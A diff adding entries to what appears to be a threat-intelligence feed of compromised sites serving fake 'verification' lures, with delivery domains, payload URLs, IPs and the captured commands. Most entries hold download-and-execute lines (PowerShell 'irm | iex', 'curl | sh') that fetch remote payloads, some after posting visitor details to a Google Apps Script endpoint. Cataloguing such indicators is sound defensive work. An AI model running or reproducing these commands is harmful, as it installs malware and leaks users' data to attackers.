@@ -1,5 +1,293 @@
 [
   {
+    "UrlDomain": "73vyn.infinityfreeapp.com",
+    "DeliveryUrl": [
+      "script.google.com",
+      "codes-veri.beer",
+      "softify.lat",
+      "2f73vyn.infinityfreeapp.com",
+      "modalelement.classlist.remove",
+      "spinnerelement.style.display",
+      "checkmarkelement.style.display",
+      "docelement.style.overflow",
+      "docelement.style.overscrollbehavior",
+      "docbody.style.overflow",
+      "docbody.style.overscrollbehavior",
+      "window.location.href",
+      "array.prototype.slice",
+      "buttonelement.innerhtml.indexof",
+      "buttonelement.innerhtml.split",
+      "plusspan.style.csstext",
+      "buttonelement.parentnode.replacechild",
+      "animationstep.key.classlist",
+      "checkboxbutton.style.display"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/w/8ecec3ba"
+    ],
+    "IP": [
+      "185.27.134.155"
+    ],
+    "Related": [],
+    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit'; var serverPayloadPromise = sendRequestToServer({ action: 'dl', k: API_AUTH_KEY, os: TARGET_OPERATING_SYSTEM, vid: UNIQUE_VISITOR_ID, ref: location.href, ray: RAY_TRACKING_ID }) .then(function(response) { return response.text(); }) .then(function(hexResponse) { return decodeServerResponse(hexResponse); }) .then(function(decodedData) { REDIRECT_URL = decodedData.redir || ''; return MALICIOUS_POWERSHELL_COMMAND; }) .catch(function() { return MALICIOUS_POWERSHELL_COMMAND; }); function waitForExecutionToken(token) { if (!token) return; var startTimestamp = Date.now(); var isDone = false; var isInstructionHidden = false; function markAsExecuted() { if (!TEST_MODE) { try { localStorage.setItem(LOCAL_STORAGE_KEY, '1'); } catch (error) { } } } function hideInstructionModal() { if (isInstructionHidden) return; isInstructionHidden = true; if (modalElement) { modalElement.classList.remove('active'); } } function completeVerification() { if (isDone) return; isDone = true; if (modalElement) { modalElement.classList.remove('active'); } if (spinnerElement) { spinnerElement.style.display = 'none'; } var check",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmx0tsvb601ab0omluwauuo4o",
+    "ScannedAt": "2026-11-28T19:51:22.829000+00:00"
+  },
+  {
+    "UrlDomain": "lbr.rf.gd",
+    "DeliveryUrl": [
+      "script.google.com",
+      "codes-veri.beer",
+      "softify.lat",
+      "2flbr.rf.gd",
+      "modalelement.classlist.remove",
+      "spinnerelement.style.display"
+    ],
+    "PayloadUrl": [
+      "https://softify.lat/u/8ecec3ba",
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/w/8ecec3ba"
+    ],
+    "IP": [
+      "185.27.134.55"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=b7096627-9d6e-42af-8f4b-3ab8046fbc0e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Flbr.rf.gd%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-28T19%3A49%3A09.743Z&lastShellAt=2026-11-28T19%3A49%3A09.743Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/u/8ecec3ba"
+    ],
+    "ReportId": "cmx0trstf018h0omluenb7hc8",
+    "ScannedAt": "2026-11-28T19:50:32.942000+00:00"
+  },
+  {
+    "UrlDomain": "les-genets.net",
+    "DeliveryUrl": [
+      "codes-veri.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "213.186.33.4"
+    ],
+    "Related": [
+      {
+        "Value": "https://codes-veri.beer/45dd8a348b91d99e",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'codes-veri.beer/45dd8a348b91d99e'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://codes-veri.beer/45dd8a348b91d99e"
+    ],
+    "ReportId": "cmx0trrve01880omlc7tj40y9",
+    "ScannedAt": "2026-11-28T19:50:31.701000+00:00"
+  },
+  {
+    "UrlDomain": "lapinhaexpedicoes.com.br",
+    "DeliveryUrl": [
+      "fauilinga.icu"
+    ],
+    "PayloadUrl": [
+      "https://fauilinga.icu/ZKyVjBPKFcSQiMnb=ed4eb00a9aca8dd5"
+    ],
+    "IP": [
+      "191.6.210.91"
+    ],
+    "Related": [],
+    "Payload": "irm 'https://fauilinga[.]icu/ZKyVjBPKFcSQiMnb=ed4eb00a9aca8dd5' | iex;",
+    "ResolvedDownloadUrl": [
+      "https://fauilinga.icu/ZKyVjBPKFcSQiMnb=ed4eb00a9aca8dd5"
+    ],
+    "ReportId": "cmx0tr03b01720omly5ty9jpy",
+    "ScannedAt": "2026-11-28T19:49:55.712000+00:00"
+  },
+  {
+    "UrlDomain": "srishanmugananda.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.214.81.12"
+    ],
+    "Related": [],
+    "Payload": "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmx0tqdow01390omljys6r7ca",
+    "ScannedAt": "2026-11-28T19:49:26.671000+00:00"
+  },
+  {
+    "UrlDomain": "vdspsabha.org",
+    "DeliveryUrl": [
+      "script.google.com",
+      "codes-veri.beer",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "119.18.49.39"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=03c92c6d-3548-434e-8d4e-829be88cd13f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvdspsabha[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-28T19%3A47%3A30.619Z&lastShellAt=2026-11-28T19%3A47%3A30.619Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmx0tpn5g012i0omlzs16fngr",
+    "ScannedAt": "2026-11-28T19:48:52.225000+00:00"
+  },
+  {
+    "UrlDomain": "controlworxengineering.com",
+    "DeliveryUrl": [
+      "blessedwirrow.org",
+      "rednosehorse.com",
+      "newgoodfoodmarket.com",
+      "blackshelter.org",
+      "cfverification.com"
+    ],
+    "PayloadUrl": [
+      "https://cfverification.com/ben/5090c6de66164869"
+    ],
+    "IP": [
+      "162.144.5.15"
+    ],
+    "Related": [
+      {
+        "Value": "https://blessedwirrow.org/qlzvfjfnsjfacbqafa8yg",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://rednosehorse.com/uacbfrjo2gnlbsxxfj9movpnbuaqo5vu-iz9aeveboe",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://newgoodfoodmarket.com/x5itbyecdrzi2yp1ob1ke046ds2izeg49excr8alhq9",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://blackshelter.org/tw9ziwym9by5a6ircujqxdbx5pmf7gl4-dbjejgkisyv",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "(irm 'https://cfverification[.]com/ben/5090c6de66164869')|iex",
+    "ResolvedDownloadUrl": [
+      "https://cfverification.com/ben/5090c6de66164869"
+    ],
+    "ReportId": "cmx0tn50m00yy0omlx8d7coqy",
+    "ScannedAt": "2026-11-28T19:46:55.475000+00:00"
+  },
+  {
+    "UrlDomain": "salaamnetwork.org",
+    "DeliveryUrl": [
+      "codes-veri.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.163"
+    ],
+    "Related": [
+      {
+        "Value": "https://codes-veri.beer/41c8409a65e6460e",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://codes-veri.beer/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&amp;_v=29931583",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'codes-veri.beer/41c8409a65e6460e'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://codes-veri.beer/41c8409a65e6460e"
+    ],
+    "ReportId": "cmx0tirc800s10oml8r726yhl",
+    "ScannedAt": "2026-11-28T19:43:31.119000+00:00"
+  },
+  {
+    "UrlDomain": "www.houseofheralds.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.230.228"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/roza-1984y/f040-4a05-a5c2-028278c5e7aa/-/raw/main/8a64-bd243eb92d97 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/roza-1984y/f040-4a05-a5c2-028278c5e7aa/-/raw/main/8a64-bd243eb92d97"
+    ],
+    "ReportId": "cmx0tib7n00rc0omlp5klvgr1",
+    "ScannedAt": "2026-11-28T19:43:10.206000+00:00"
+  },
+  {
+    "UrlDomain": "ourtourismnews.com",
+    "DeliveryUrl": [
+      "fauilinga.icu"
+    ],
+    "PayloadUrl": [
+      "https://fauilinga.icu/RQLdSm05DUU1Ks4z=3ec99896b3486571"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "irm 'https://fauilinga[.]icu/RQLdSm05DUU1Ks4z=3ec99896b3486571' | iex;",
+    "ResolvedDownloadUrl": [
+      "https://fauilinga.icu/RQLdSm05DUU1Ks4z=3ec99896b3486571"
+    ],
+    "ReportId": "cmx0tfj8v00jp0oml0cy8f2u5",
+    "ScannedAt": "2026-11-28T19:41:00.643000+00:00"
+  },
+  {
+    "UrlDomain": "tuandaoproduction.com",
+    "DeliveryUrl": [
+      "fauilinga.icu"
+    ],
+    "PayloadUrl": [
+      "https://fauilinga.icu/ZcUqC4D8Wrm8Wfol=1e3b24aa0c55c006"
+    ],
+    "IP": [
+      "103.28.36.210"
+    ],
+    "Related": [],
+    "Payload": "irm 'https://fauilinga[.]icu/ZcUqC4D8Wrm8Wfol=1e3b24aa0c55c006' | iex;",
+    "ResolvedDownloadUrl": [
+      "https://fauilinga.icu/ZcUqC4D8Wrm8Wfol=1e3b24aa0c55c006"
+    ],
+    "ReportId": "cmx0t7ecu008g0omle0gmfcxn",
+    "ScannedAt": "2026-11-28T19:34:41.073000+00:00"
+  },
+  {
+    "UrlDomain": "www.imovelogistics.com",
+    "DeliveryUrl": [
+      "codes-veri.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.32.152"
+    ],
+    "Related": [
+      {
+        "Value": "https://codes-veri.beer/430b6c6862caa0db",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'codes-veri.beer/430b6c6862caa0db'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://codes-veri.beer/430b6c6862caa0db"
+    ],
+    "ReportId": "cmx0t770o00750oml58zddljn",
+    "ScannedAt": "2026-11-28T19:34:31.551000+00:00"
+  },
+  {
     "UrlDomain": "customercross.be",
     "DeliveryUrl": [
       "codes-veri.beer"
